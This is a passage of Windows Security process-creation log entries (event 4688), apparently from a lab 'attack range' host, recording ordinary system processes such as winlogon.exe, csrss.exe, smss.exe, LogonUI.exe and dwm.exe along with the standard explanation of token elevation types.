+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:36 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52738938
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		Window Manager\DWM-3
+	Account Name:		DWM-3
+	Account Domain:		Window Manager
+	Logon ID:		0x504BFF2
+
+Process Information:
+	New Process ID:		0x1d0c
+	New Process Name:	C:\Windows\System32\dwm.exe
+	Token Elevation Type:	%%1938
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1e40
+	Creator Process Name:	C:\Windows\System32\winlogon.exe
+	Process Command Line:	"dwm.exe"
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:36 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52738931
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1430
+	New Process Name:	C:\Windows\System32\LogonUI.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x1e40
+	Creator Process Name:	C:\Windows\System32\winlogon.exe
+	Process Command Line:	"LogonUI.exe" /flags:0x2 /state0:0xa39b1055 /state1:0x41c64e6d
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:36 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52738855
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1e40
+	New Process Name:	C:\Windows\System32\winlogon.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x18b8
+	Creator Process Name:	C:\Windows\System32\smss.exe
+	Process Command Line:	winlogon.exe
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:36 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52738850
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1cb4
+	New Process Name:	C:\Windows\System32\csrss.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x18b8
+	Creator Process Name:	C:\Windows\System32\smss.exe
+	Process Command Line:	%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:36 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52738849
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x18b8
+	New Process Name:	C:\Windows\System32\smss.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x130
+	Creator Process Name:	C:\Windows\System32\smss.exe
+	Process Command Line:	\SystemRoot\System32\smss.exe 00000114 0000007c 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
